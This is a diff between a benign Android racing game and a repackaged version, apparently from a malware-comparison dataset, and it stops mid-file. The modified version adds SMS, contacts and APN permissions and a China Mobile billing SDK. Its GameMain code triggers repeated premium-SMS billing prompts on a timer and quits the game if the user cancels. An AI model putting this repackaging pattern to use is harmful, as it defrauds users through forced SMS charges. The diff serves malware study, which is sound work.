@@ -1,0 +1,903 @@
+diff -r result/APP_19/App_B_19/AndroidManifest.xml result/APP_19/App_M_19/AndroidManifest.xml
+2c2,10
+<     <uses-permission android:name="android.permission.VIBRATE"/>
+---
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.SEND_SMS"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
+>     <uses-permission android:name="android.permission.READ_CONTACTS"/>
+3a12
+>     <uses-permission android:name="android.permission.VIBRATE"/>
+9a19,22
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CHINAMOBILE_OMS_GAME"/>
+>                 <category android:name="android.intent.category.CHINAMOBILE_GAMES"/>
+>             </intent-filter>
+10a24,27
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="cn.emagsoftware.gamebilling.activity.BillingActivity" android:screenOrientation="landscape" android:windowSoftInputMode="stateHidden"/>
+>         <activity android:name="cn.emagsoftware.gamebilling.activity.GameExitActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
+>         <activity android:name="cn.emagsoftware.gamebilling.activity.GameDialogActivity" android:screenOrientation="landscape"/>
+>         <activity android:name="cn.emagsoftware.gamebilling.activity.GameOpenActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
+diff -r result/APP_19/App_B_19/apktool.yml result/APP_19/App_M_19/apktool.yml
+2c2
+< apkFileName: Bapp19-2528FC8BB788005AE524BCCD2738B380066BD38ABAF4D1388410D39E7DF8B4B8.apk
+---
+> apkFileName: Mapp19-6E84F130A315A5CDCA428ABE9224759622DE3D36591CB3981849C76DDC111828.apk
+5d4
+< - resources.arsc
+8a8,10
+> - mid
+> - assets/Charge.xml
+> - assets/ConsumeCodeInfo.xml
+Somente em result/APP_19/App_M_19/: assets
+Somente em result/APP_19/App_M_19/: cn
+diff -r result/APP_19/App_B_19/Mag3DLite/GameApp/CSettings.java result/APP_19/App_M_19/Mag3DLite/GameApp/CSettings.java
+39c39
+<     ((SLevelDesc)localObject).name = "Mine1";
+---
+>     ((SLevelDesc)localObject).name = "001";
+50c50
+<     ((SLevelDesc)localObject).name = "Mine2";
+---
+>     ((SLevelDesc)localObject).name = "002";
+61c61
+<     ((SLevelDesc)localObject).name = "Base";
+---
+>     ((SLevelDesc)localObject).name = "003";
+72c72
+<     ((SLevelDesc)localObject).name = "Factory";
+---
+>     ((SLevelDesc)localObject).name = "004";
+83c83
+<     ((SLevelDesc)localObject).name = "Colony";
+---
+>     ((SLevelDesc)localObject).name = "005";
+94c94
+<     ((SLevelDesc)localObject).name = "Channels";
+---
+>     ((SLevelDesc)localObject).name = "006";
+106c106
+<     ((SVehicleDesc)localObject).name = "HCM 4020";
+---
+>     ((SVehicleDesc)localObject).name = "002";
+118c118
+<     ((SVehicleDesc)localObject).name = "HCM 1001";
+---
+>     ((SVehicleDesc)localObject).name = "003";
+130c130
+<     ((SVehicleDesc)localObject).name = "HCM 2000";
+---
+>     ((SVehicleDesc)localObject).name = "001";
+diff -r result/APP_19/App_B_19/Mag3DLite/SF3D/GameMain.java result/APP_19/App_M_19/Mag3DLite/SF3D/GameMain.java
+9a10,12
+> import android.os.Handler;
+> import android.os.Looper;
+> import android.os.Message;
+11a15
+> import android.os.Process;
+17a22,25
+> import android.widget.Toast;
+> import cn.emagsoftware.gamebilling.api.GameInterface;
+> import cn.emagsoftware.gamebilling.api.GameInterface.BillingCallback;
+> import java.io.PrintStream;
+20a29
+>   implements Runnable
+51a61
+>   private Handler handler;
+92a103,172
+>   public void initGameinfo()
+>   {
+>     GameInterface.initializeApp(this);
+>     this.handler = new Handler(Looper.getMainLooper())
+>     {
+>       public void handleMessage(Message paramAnonymousMessage)
+>       {
+>         super.handleMessage(paramAnonymousMessage);
+>         switch (paramAnonymousMessage.what)
+>         {
+>         default: 
+>           super.handleMessage(paramAnonymousMessage);
+>         }
+>         do
+>         {
+>           do
+>           {
+>             return;
+>             System.out.println("aaaaaaaaaaaaaaaaaaaaaaaaa");
+>           } while ((!GameInterface.getActivateFlag("000")) || (GameInterface.getActivateFlag("001")));
+>           GameInterface.doBilling(true, false, "001", new GameInterface.BillingCallback()
+>           {
+>             public void onBillingFail()
+>             {
+>               Toast.makeText(GameMain.this, "计费失败！", 1).show();
+>               GameMain.this.finish();
+>             }
+>             
+>             public void onBillingSuccess()
+>             {
+>               Toast.makeText(GameMain.this, "计费成功！", 1).show();
+>               GameInterface.setActivateFlag("001", true);
+>             }
+>             
+>             public void onUserOperCancel()
+>             {
+>               Toast.makeText(GameMain.this, "计费失败！", 1).show();
+>               GameMain.this.finish();
+>               Process.killProcess(Process.myPid());
+>             }
+>           });
+>           return;
+>           System.out.println("bbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
+>         } while (GameInterface.getActivateFlag("000"));
+>         GameInterface.doBilling(true, false, "000", new GameInterface.BillingCallback()
+>         {
+>           public void onBillingFail()
+>           {
+>             Toast.makeText(GameMain.this, "计费失败！", 1).show();
+>             GameMain.this.finish();
+>           }
+>           
+>           public void onBillingSuccess()
+>           {
+>             Toast.makeText(GameMain.this, "计费成功！", 1).show();
+>             GameInterface.setActivateFlag("000", true);
+>           }
+>           
+>           public void onUserOperCancel()
+>           {
+>             Toast.makeText(GameMain.this, "计费失败！", 1).show();
+>             GameMain.this.finish();
+>             System.exit(0);
+>           }
+>         });
+>       }
+>     };
+>     new Thread(this).start();
+>   }
+>   
+94a175
+>     initGameinfo();
+177a259,282
+>   }
+>   
+>   public void run()
+>   {
+>     try
+>     {
+>       for (;;)
+>       {
+>         Message localMessage = this.handler.obtainMessage();
+>         System.out.println("11111111111");
+>         localMessage.what = 1;
+>         this.handler.sendMessage(localMessage);
+>         Thread.sleep(120000L);
+>         localMessage = this.handler.obtainMessage();
+>         localMessage.what = 2;
+>         System.out.println("222222222");
+>         this.handler.sendMessage(localMessage);
+>         Thread.sleep(480000L);
+>       }
+>     }
+>     catch (InterruptedException localInterruptedException)
+>     {
+>       localInterruptedException.printStackTrace();
+>     }
+Os arquivos binários result/APP_19/App_B_19/original/AndroidManifest.xml e result/APP_19/App_M_19/original/AndroidManifest.xml são diferentes
+Somente em result/APP_19/App_B_19/original/META-INF: AWESOMEA.RSA
+Somente em result/APP_19/App_B_19/original/META-INF: AWESOMEA.SF
+Somente em result/APP_19/App_M_19/original/META-INF: HUAWEI_C.RSA
+Somente em result/APP_19/App_M_19/original/META-INF: HUAWEI_C.SF
+diff -r result/APP_19/App_B_19/original/META-INF/MANIFEST.MF result/APP_19/App_M_19/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.6.0_20 (Sun Microsystems Inc.)
+---
+> Created-By: 1.6.0_26 (Sun Microsystems Inc.)
+33a34,36
+> Name: assets/OpeningAnimation/g_rotate_left.png
+> SHA1-Digest: ONW2mOkE+1wuDkrGOSJIe1fq9YA=
+> 
+45a49,51
+> Name: assets/OpeningAnimation/g_no_hl.png
+> SHA1-Digest: nQtdUHp8fstccjqq9fg5w4HpX1U=
+> 
+55,57d60
+< Name: res/raw/hud.3DM
+< SHA1-Digest: gybCMAV5ZjFH+gYua/cZ+aiPxtk=
+< 
+60a64,66
+> Name: res/raw/hud.3DM
+> SHA1-Digest: gybCMAV5ZjFH+gYua/cZ+aiPxtk=
+> 
+77c83
+< SHA1-Digest: O8wZWFhyzoMon9+n4DAyrJK9rXs=
+---
+> SHA1-Digest: JPaC/AjE1GcSWDtAcj90siuDSVw=
+81a88,90
+> Name: assets/ConsumeCodeInfo.xml
+> SHA1-Digest: NG3FLPdszq6l94+4eEJE7ET4Zk8=
+> 
+94,96d102
+< Name: res/drawable/kopalnia_banda1.png
+< SHA1-Digest: ebFQe9Bs1q6GHhNMWdxxbL13tQY=
+< 
+99a106,108
+> Name: res/drawable/kopalnia_banda1.png
+> SHA1-Digest: ebFQe9Bs1q6GHhNMWdxxbL13tQY=
+> 
+106,108d114
+< Name: res/drawable/iskra_glow.png
+< SHA1-Digest: Mm0EyPTkntAkZxOpsl6D6owkwoc=
+< 
+111a118,120
+> Name: res/drawable/iskra_glow.png
+> SHA1-Digest: Mm0EyPTkntAkZxOpsl6D6owkwoc=
+> 
+117a127,132
+> Name: assets/OpeningAnimation/g_logo_s.png
+> SHA1-Digest: /6hPZHcS2JS0vMC7X6CgzZc19Qk=
+> 
+> Name: assets/OpeningAnimation/g_no.png
+> SHA1-Digest: lNahvejF4l0l+IdyqTy1i8YGi9E=
+> 
+133,134c148,149
+< Name: res/drawable/hud.png
+< SHA1-Digest: fKLeqw8+DB3Xd4xlVLeWPPYvFVk=
+---
+> Name: assets/OpeningAnimation/g_logo_cp.png
+> SHA1-Digest: 52KLprS/yrX/+a4IiZPkdCHGhgY=
+138a154,156
+> Name: res/drawable/hud.png
+> SHA1-Digest: F9ZwcQy+OpPq71K6zEq6G/9l2ng=
+> 
+160,161c178,179
+< Name: res/raw/plane.3dm
+< SHA1-Digest: QYgg8nelCworbvblAs+GX8e2lEo=
+---
+> Name: assets/OpeningAnimation/g_exit.png
+> SHA1-Digest: ymhDLbekZZ9mZcXKdhK24kz8Yl8=
+165a184,186
+> Name: res/raw/plane.3dm
+> SHA1-Digest: QYgg8nelCworbvblAs+GX8e2lEo=
+> 
+178,180d198
+< Name: res/drawable/glow_red.png
+< SHA1-Digest: Je/adQmXHYKjWmvHmPBkHqzx6Ok=
+< 
+183a202,204
+> Name: res/drawable/glow_red.png
+> SHA1-Digest: Je/adQmXHYKjWmvHmPBkHqzx6Ok=
+> 
+187,188c208,209
+< Name: res/raw/kanaly.3DM
+< SHA1-Digest: j0rLMyTmVg8kmNZ53VwBIBo3oCI=
+---
+> Name: assets/OpeningAnimation/g_bg_exit.png
+> SHA1-Digest: FuHon4cgmf7rp5bWqXK/Bon6Ms4=
+192a214,219
+> Name: res/raw/kanaly.3DM
+> SHA1-Digest: j0rLMyTmVg8kmNZ53VwBIBo3oCI=
+> 
+> Name: assets/OpeningAnimation/g_yes_hl.png
+> SHA1-Digest: e/qJ54+mE8XseGt117FZEkY8HzM=
+> 
+199,201d225
+< Name: res/raw/fabrykalev.lev
+< SHA1-Digest: q9M4w/LQw4MbBw6HYp4FSMo7KkE=
+< 
+204a229,231
+> Name: res/raw/fabrykalev.lev
+> SHA1-Digest: q9M4w/LQw4MbBw6HYp4FSMo7KkE=
+> 
+214,216d240
+< Name: res/drawable/monitor_noise06.png
+< SHA1-Digest: s9AKFqC3v/f19Eh6FdMO5DJxXzE=
+< 
+219a244,246
+> Name: res/drawable/monitor_noise06.png
+> SHA1-Digest: s9AKFqC3v/f19Eh6FdMO5DJxXzE=
+> 
+226,228d252
+< Name: res/raw/logo1.3gp
+< SHA1-Digest: BV0GkP2NJJFOPfx4pFBKmp+baoE=
+< 
+231a256,258
+> Name: res/raw/logo1.3gp
+> SHA1-Digest: BV0GkP2NJJFOPfx4pFBKmp+baoE=
+> 
+255a283,285
+> Name: assets/OpeningAnimation/g_divider_land.png
+> SHA1-Digest: QEiMpakvIVycPIZkGUw2ZaXs5oo=
+> 
+282a313,315
+> Name: assets/OpeningAnimation/g_exit_hl.png
+> SHA1-Digest: 7C8dmuEtoImtzb943hYbOd3ms04=
+> 
+288a322,324
+> Name: assets/Charge.xml
+> SHA1-Digest: l7zH4ACiceXklwIzMCQo+EAjfys=
+> 
+352,353c388,389
+< Name: res/drawable/budynek.png
+< SHA1-Digest: eX0d9S7/B+LdRCmJTeolxySHUE4=
+---
+> Name: res/drawable/volum1.png
+> SHA1-Digest: MO905V4lk6DXcUKSDfe+45vxsA8=
+356c392
+< SHA1-Digest: rcT7SELw5YlEOcaUpv9yDO3meU0=
+---
+> SHA1-Digest: RRytEn5s9I4DkI1f3sUcbLUvI9k=
+358,359c394,395
+< Name: res/drawable/volum1.png
+< SHA1-Digest: MO905V4lk6DXcUKSDfe+45vxsA8=
+---
+> Name: res/drawable/budynek.png
+> SHA1-Digest: eX0d9S7/B+LdRCmJTeolxySHUE4=
+363a400,402
+> Name: res/drawable/startgo.png
+> SHA1-Digest: 9d/tLg2e9h3iYX5Txe5oTFa5PYo=
+> 
+367,369d405
+< Name: res/drawable/startgo.png
+< SHA1-Digest: 2T/ywinmCHbksIlHCHWVRwPlYUw=
+< 
+414a451,453
+> Name: res/drawable/tekstaw.png
+> SHA1-Digest: SyFsMiyvoFapC8Q3ooGQGirPC2w=
+> 
+418,420d456
+< Name: res/drawable/tekstaw.png
+< SHA1-Digest: WarOECur3N2HXm5npU28R4a9R8g=
+< 
+450a487,489
+> Name: assets/OpeningAnimation/g_exit_ask.png
+> SHA1-Digest: cVlWa2/5Ob6tHHcKYmRx1RTRVjA=
+> 
+455c494
+< SHA1-Digest: qYrOX/KX61oG2PCjhfLZdR5jDFU=
+---
+> SHA1-Digest: YiAQn6Fync45TO53eHuzQj9WLpU=
+482c521
+< SHA1-Digest: dfGaU1Ie4XjXNoAgtsSXMgWq5Kk=
+---
+> SHA1-Digest: uEoVhgk/kguQgiM/gRo3jlvXxSQ=
+492a532,534
+> Name: res/raw/opening_sound.mid
+> SHA1-Digest: mFDMwGfLVsJXoP5tzs1AOP6Fa/s=
+> 
+503c545
+< SHA1-Digest: rWqx4Kt4KedhMhYPq0taVQ3tl2Y=
+---
+> SHA1-Digest: +vIq76RqQbMqqTSADWvDBCuUB2o=
+510a553,555
+> Name: assets/OpeningAnimation/g_sound_ask.png
+> SHA1-Digest: tGSyo+bCfdZtnY+qxJc05oKxUno=
+> 
+519a565,567
+> Name: assets/OpeningAnimation/g_ok.png
+> SHA1-Digest: X2ZPLj90rpMPGo2FZ+piyPdhwRs=
+> 
+526,528d573
+< Name: res/drawable/loading_kanaly.png
+< SHA1-Digest: m0mhYyERX5pHP6Yz6s8fSRgPKIM=
+< 
+531a577,579
+> Name: res/drawable/loading_kanaly.png
+> SHA1-Digest: m0mhYyERX5pHP6Yz6s8fSRgPKIM=
+> 
+536c584
+< SHA1-Digest: mbX3cLIGAOEStBgEM/seIvV3leM=
+---
+> SHA1-Digest: Sc2V7wKfMG4GP9qip2zx+YnUrMA=
+541,543d588
+< Name: res/drawable/wybuch10.png
+< SHA1-Digest: XtkavRfnHcieL2we91KxZpfMxh4=
+< 
+546a592,594
+> Name: res/drawable/wybuch10.png
+> SHA1-Digest: XtkavRfnHcieL2we91KxZpfMxh4=
+> 
+550,551c598,599
+< Name: res/raw/latacz02.3DM
+< SHA1-Digest: Zg5Mx199npAWWVja0sJubFENYCs=
+---
+> Name: res/drawable/menu_levels.png
+> SHA1-Digest: Elfxb3Cu6Lz1jjULA18nft6I0ME=
+556,557c604,605
+< Name: res/drawable/menu_levels.png
+< SHA1-Digest: tPHGfPjXqYraSq1dQbhIHEQjlf0=
+---
+> Name: res/raw/latacz02.3DM
+> SHA1-Digest: Zg5Mx199npAWWVja0sJubFENYCs=
+560c608
+< SHA1-Digest: LPo885ynlrtJ7yrMOgl4gjyVpcM=
+---
+> SHA1-Digest: s9HnOEXXm1DBQ7VW1pypmNF5rWM=
+582a631,633
+> Name: assets/OpeningAnimation/g_logo.png
+> SHA1-Digest: Mtflydnr5zPpRigkOfte6Nwrj44=
+> 
+589,591d639
+< Name: res/drawable/gui_close.png
+< SHA1-Digest: KBDRTPo1+jez2o5YeMrk6dkZrRY=
+< 
+595,599c643,644
+< Name: res/raw/wiatrak_2.3DM
+< SHA1-Digest: 3JPFcKuwwPHTeJzMvbw2PxsVxpE=
+< 
+< Name: res/raw/sndsilnik2.ogg
+< SHA1-Digest: q3ZeU+v+UKjcBjGIUyxUV0+bMV8=
+---
+> Name: res/drawable/gui_close.png
+> SHA1-Digest: KBDRTPo1+jez2o5YeMrk6dkZrRY=
+606a652,657
+> Name: res/raw/sndsilnik2.ogg
+> SHA1-Digest: q3ZeU+v+UKjcBjGIUyxUV0+bMV8=
+> 
+> Name: res/raw/wiatrak_2.3DM
+> SHA1-Digest: 3JPFcKuwwPHTeJzMvbw2PxsVxpE=
+> 
+610,612d660
+< Name: classes.dex
+< SHA1-Digest: p2RN5rD76ZpIodiw3gq8WohiPwA=
+< 
+616,617c664,665
+< Name: res/raw/latacz.3dm
+< SHA1-Digest: 9NE5pQrFqtHoIHqkPxQBEQdf4fw=
+---
+> Name: classes.dex
+> SHA1-Digest: lP1PBtT5D3/vQFY4tfp48oIGv5o=
+621a670,672
+> Name: res/raw/latacz.3dm
+> SHA1-Digest: 9NE5pQrFqtHoIHqkPxQBEQdf4fw=
+> 
+626c677
+< SHA1-Digest: rMLCtFkrefPX4hpX86JSGLN0j8M=
+---
+> SHA1-Digest: QqWxgGLcZQDzSehWRndRmtG4NDE=
+645a697,699
+> Name: assets/OpeningAnimation/g_cmcc_title.png
+> SHA1-Digest: Rq/Eqpah4yVifnRfyJQDs+NNT4o=
+> 
+657a712,714
+> Name: assets/OpeningAnimation/g_logo_sp.png
+> SHA1-Digest: u3sWdDw5aFjpHl20Pm0/ga1MoEU=
+> 
+664,665c721,722
+< Name: res/raw/sndprzycisk.ogg
+< SHA1-Digest: BniZp/9xDxh0p7x536bIjABpAd0=
+---
+> Name: assets/OpeningAnimation/g_rocker.png
+> SHA1-Digest: YHuVWiO8yLXgukknJaF8GN7a+K4=
+669a727,732
+> Name: res/raw/sndprzycisk.ogg
+> SHA1-Digest: BniZp/9xDxh0p7x536bIjABpAd0=
+> 
+> Name: res/drawable/mina.png
+> SHA1-Digest: fLOU4PbK0kZS2jMlj7tZSBy3Bww=
+> 
+676,677c739,740
+< Name: res/drawable/mina.png
+< SHA1-Digest: fLOU4PbK0kZS2jMlj7tZSBy3Bww=
+---
+> Name: res/drawable/fabryka_skydown.png
+> SHA1-Digest: e0gGyvQrAxQ1M9AgmHPDDCmxHMs=
+682,684d744
+< Name: res/drawable/fabryka_skydown.png
+< SHA1-Digest: e0gGyvQrAxQ1M9AgmHPDDCmxHMs=
+< 
+687a748,753
+> Name: assets/OpeningAnimation/ChPkgs.xml
+> SHA1-Digest: 2lR/nBtryUuAjNVffBiwNbklyMQ=
+> 
+> Name: assets/OpeningAnimation/g_logo_cmcc.png
+> SHA1-Digest: evFQ4S5bYXHCB5ynhl2QhonHQRo=
+> 
+690a757,759
+> Name: assets/OpeningAnimation/g_rotate_right.png
+> SHA1-Digest: y+Kq5xWMK/cN59YyLTOvJZKE+ts=
+> 
+693a763,765
+> Name: res/drawable/start2.png
+> SHA1-Digest: 8LnjA5SyExmAxxsSJA46ZYVb1WA=
+> 
+697,698c769,770
+< Name: res/drawable/start2.png
+< SHA1-Digest: 8LnjA5SyExmAxxsSJA46ZYVb1WA=
+---
+> Name: assets/OpeningAnimation/g_yes.png
+> SHA1-Digest: tzGV9LPu8pZRtlPEkP/cRJu8LKQ=
+705a778,780
+> Name: res/drawable/menu_colony.png
+> SHA1-Digest: 9Br9heIkxfWDB1tcYCTxVaCwVqM=
+> 
+709,710c784,785
+< Name: res/drawable/menu_colony.png
+< SHA1-Digest: 9Br9heIkxfWDB1tcYCTxVaCwVqM=
+---
+> Name: assets/OpeningAnimation/g_divider.png
+> SHA1-Digest: 46kL4oUHqcpFE0aRAww40sFi7vc=
+715,717d789
+< Name: res/raw/meta_szachownica2.3DM
+< SHA1-Digest: 3/b01f5rPnJrCYqVArDgettRAdU=
+< 
+720a793,795
+> Name: res/raw/meta_szachownica2.3DM
+> SHA1-Digest: 3/b01f5rPnJrCYqVArDgettRAdU=
+> 
+723a799,801
+> Name: res/drawable/histoty.png
+> SHA1-Digest: +MMF9Z2H+qAEn5vblZKTgqMj97o=
+> 
+725c803
+< SHA1-Digest: mNhReeqS1cSfOO6vc9wKHKMezLU=
+---
+> SHA1-Digest: PCNlr0k9sCzzKVHRfkiAC5DhX3I=
+727,728c805,806
+< Name: res/drawable/histoty.png
+< SHA1-Digest: zsHSgKjENPu8OZk2M5waxDwzkm0=
+---
+> Name: assets/OpeningAnimation/g_rotate_mid.png
+> SHA1-Digest: 7YOUkDk+auUhYfTTwaBDTa27tHU=
+747a826,828
+> Name: assets/OpeningAnimation/g_ok_hl.png
+> SHA1-Digest: /5woS76QVvHBaL4Ngl5AwuQEdbY=
+> 
+751,752c832,839
+< Name: res/raw/mina.3DM
+< SHA1-Digest: F6Dy8BjedWxsxlknD+66LpewS6w=
+---
+> Name: assets/Config.xml
+> SHA1-Digest: pdl3VjpGPxtjIG2D6b+sDEDJiq4=
+> 
+> Name: assets/OpeningAnimation/g_game_title.png
+> SHA1-Digest: TJrcz98hPFExIyb4Rd4WE+LD57U=
+> 
+> Name: assets/OpeningAnimation/g_more_ask.png
+> SHA1-Digest: 9VDK4CWn+51PDW8Wg0zhwrnF1JI=
+756a844,846
+> Name: res/raw/mina.3DM
+> SHA1-Digest: F6Dy8BjedWxsxlknD+66LpewS6w=
+> 
+761c851
+< SHA1-Digest: /w3XhSQGq67Wsm2kqCLW39KXS20=
+---
+> SHA1-Digest: 914YaijllINK4oZ0DRZF/AjkMxw=
+767c857
+< SHA1-Digest: gq0SNM/VR1R+OLyGNtidKjKbJKA=
+---
+> SHA1-Digest: HiEaOR6g3v0gCrUwoZq3kLGSe40=
+782c872
+< SHA1-Digest: nsvVXSxrmyxbG0uIRHGieVv2qfA=
+---
+> SHA1-Digest: K8WZ/fD5F6FzjCDBpjqaVTWj1M4=
+793,795d882
+< Name: res/drawable/glow_green.png
+< SHA1-Digest: GnmL6+nnt9TSErcHlWnMb0zjcbc=
+< 
+798a886,888
+> Name: res/drawable/glow_green.png
+> SHA1-Digest: GnmL6+nnt9TSErcHlWnMb0zjcbc=
+> 
+811,813d900
+< Name: res/drawable/blue1.png
+< SHA1-Digest: v7WRPFTGJiw4zdaETWoIbUSSWJY=
+< 
+815a903,905
+> 
+> Name: res/drawable/blue1.png
+> SHA1-Digest: v7WRPFTGJiw4zdaETWoIbUSSWJY=
+Os arquivos binários result/APP_19/App_B_19/res/drawable/credits.png e result/APP_19/App_M_19/res/drawable/credits.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/diffculty.png e result/APP_19/App_M_19/res/drawable/diffculty.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/histoty.png e result/APP_19/App_M_19/res/drawable/histoty.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/hud.png e result/APP_19/App_M_19/res/drawable/hud.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/lastlap.png e result/APP_19/App_M_19/res/drawable/lastlap.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/logorat.png e result/APP_19/App_M_19/res/drawable/logorat.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/main_menu.png e result/APP_19/App_M_19/res/drawable/main_menu.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/menu_levels.png e result/APP_19/App_M_19/res/drawable/menu_levels.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/optionsmenu.png e result/APP_19/App_M_19/res/drawable/optionsmenu.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/race_info.png e result/APP_19/App_M_19/res/drawable/race_info.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/startgo.png e result/APP_19/App_M_19/res/drawable/startgo.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/steering_back.png e result/APP_19/App_M_19/res/drawable/steering_back.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/steering.png e result/APP_19/App_M_19/res/drawable/steering.png são diferentes
+Os arquivos binários result/APP_19/App_B_19/res/drawable/tekstaw.png e result/APP_19/App_M_19/res/drawable/tekstaw.png são diferentes
+Somente em result/APP_19/App_M_19/res/raw: opening_sound.mid
+diff -r result/APP_19/App_B_19/res/values/public.xml result/APP_19/App_M_19/res/values/public.xml
+272,273c272,331
+<     <public type="string" name="hello" id="0x7f050000" />
+<     <public type="string" name="app_name" id="0x7f050001" />
+---
+>     <public type="raw" name="opening_sound" id="0x7f040037" />
+>     <public type="string" name="g_class_name" id="0x7f050000" />
+>     <public type="string" name="gc_billing_package_id" id="0x7f050001" />
+>     <public type="string" name="gc_billing_package_name" id="0x7f050002" />
+>     <public type="string" name="gc_billing_islow_version" id="0x7f050003" />
+>     <public type="string" name="gc_billing_is_no_sound" id="0x7f050004" />
+>     <public type="string" name="gc_billing_title" id="0x7f050005" />
+>     <public type="string" name="gc_billing_title_2" id="0x7f050006" />
+>     <public type="string" name="gc_billing_sending" id="0x7f050007" />
+>     <public type="string" name="gc_billing_info_sms_1" id="0x7f050008" />
+>     <public type="string" name="gc_billing_info_sms_2" id="0x7f050009" />
+>     <public type="string" name="gc_billing_info_sms_3" id="0x7f05000a" />
+>     <public type="string" name="gc_billing_info_sms_4" id="0x7f05000b" />
+>     <public type="string" name="gc_billing_info_sms_6" id="0x7f05000c" />
+>     <public type="string" name="gc_billing_info_sms_7" id="0x7f05000d" />
+>     <public type="string" name="gc_billing_info_sms_8" id="0x7f05000e" />
+>     <public type="string" name="gc_billing_info_sms_9" id="0x7f05000f" />
+>     <public type="string" name="gc_billing_info_sms_a" id="0x7f050010" />
+>     <public type="string" name="gc_billing_error_network" id="0x7f050011" />
+>     <public type="string" name="gc_billing_ok" id="0x7f050012" />
+>     <public type="string" name="gc_billing_ok_history" id="0x7f050013" />
+>     <public type="string" name="gc_billing_fail" id="0x7f050014" />
+>     <public type="string" name="gc_billing_require" id="0x7f050015" />
+>     <public type="string" name="gc_billing_no_simcard" id="0x7f050016" />
+>     <public type="string" name="gc_billing_simcard_unavailable" id="0x7f050017" />
+>     <public type="string" name="gc_billing_check_network" id="0x7f050018" />
+>     <public type="string" name="gc_billing_network_airplane" id="0x7f050019" />
+>     <public type="string" name="gc_billing_network_multi" id="0x7f05001a" />
+>     <public type="string" name="gc_billing_cmgc_game_tag" id="0x7f05001b" />
+>     <public type="string" name="gc_billing_dialog_charging" id="0x7f05001c" />
+>     <public type="string" name="gc_billing_invalid_china_mobile_card" id="0x7f05001d" />
+>     <public type="string" name="gc_billing_fail_phone" id="0x7f05001e" />
+>     <public type="string" name="gc_billing_fail_vericode" id="0x7f05001f" />
+>     <public type="string" name="gc_billing_no_charge" id="0x7f050020" />
+>     <public type="string" name="gc_billing_no_vericode" id="0x7f050021" />
+>     <public type="string" name="gc_billing_no_phone_number" id="0x7f050022" />
+>     <public type="string" name="gc_billing_info_title" id="0x7f050023" />
+>     <public type="string" name="gc_billing_info_title_2" id="0x7f050024" />
+>     <public type="string" name="gc_billing_net_info" id="0x7f050025" />
+>     <public type="string" name="gc_billing_net_verifycode" id="0x7f050026" />
+>     <public type="string" name="gc_billing_net_verifycode_1" id="0x7f050027" />
+>     <public type="string" name="gc_billing_net_verifycode_2" id="0x7f050028" />
+>     <public type="string" name="gc_billing_net_phone" id="0x7f050029" />
+>     <public type="string" name="gc_billing_net_phone_2" id="0x7f05002a" />
+>     <public type="string" name="gc_billing_more_time_error" id="0x7f05002b" />
+>     <public type="string" name="gc_billing_net_contacts" id="0x7f05002c" />
+>     <public type="string" name="gc_billing_net_contacts_error" id="0x7f05002d" />
+>     <public type="string" name="gc_billing_dialog_sure_space" id="0x7f05002e" />
+>     <public type="string" name="gc_billing_dialog_clear_space" id="0x7f05002f" />
+>     <public type="string" name="gc_billing_dialog_continue" id="0x7f050030" />
+>     <public type="string" name="gc_billing_dialog_exit" id="0x7f050031" />
+>     <public type="string" name="gc_billing_dialog_information" id="0x7f050032" />
+>     <public type="string" name="gc_billing_dialog_sure" id="0x7f050033" />
+>     <public type="string" name="gc_billing_dialog_clear" id="0x7f050034" />
+>     <public type="string" name="gc_billing_dialog_reject" id="0x7f050035" />
+>     <public type="string" name="gc_billing_dialog_positive" id="0x7f050036" />
+>     <public type="string" name="gc_billing_dialog_neutral" id="0x7f050037" />
+>     <public type="string" name="gc_billing_dialog_cancel" id="0x7f050038" />
+>     <public type="string" name="hello" id="0x7f050039" />
+>     <public type="string" name="app_name" id="0x7f05003a" />
+diff -r result/APP_19/App_B_19/res/values/strings.xml result/APP_19/App_M_19/res/values/strings.xml
+2a3,63
+>     <string name="g_class_name">Mag3DLite.SF3D.GameMain</string>
+>     <string name="gc_billing_package_id" />
+>     <string name="gc_billing_package_name" />
+>     <string name="gc_billing_islow_version">false</string>
+>     <string name="gc_billing_is_no_sound">false</string>
+>     <string name="gc_billing_title">中国移动手机游戏</string>
+>     <string name="gc_billing_title_2">感谢您支持正版游戏</string>
+>     <string name="gc_billing_sending">正在发送激活短信！</string>
+>     <string name="gc_billing_info_sms_1">尊敬的{0}用户，您即将购买：</string>
+>     <string name="gc_billing_info_sms_2">"
+> 游戏名称：{0}"</string>
+>     <string name="gc_billing_info_sms_3">游戏提供商：{0}</string>
+>     <string name="gc_billing_info_sms_4">客服电话：{0}</string>
+>     <string name="gc_billing_info_sms_6">{0}</string>
+>     <string name="gc_billing_info_sms_7">共需支付话费{0}元（折合{1}点）</string>
+>     <string name="gc_billing_info_sms_8">请点击《确定》发送短信确认购买。</string>
+>     <string name="gc_billing_info_sms_9">请点击《确定》确认购买。</string>
+>     <string name="gc_billing_info_sms_a">* 该道具不属于{0}权益，您可以选择取消购买并免费继续游戏，或确认购买该道具以获得更好的游戏体验。</string>
+>     <string name="gc_billing_error_network">"网络连接失败！
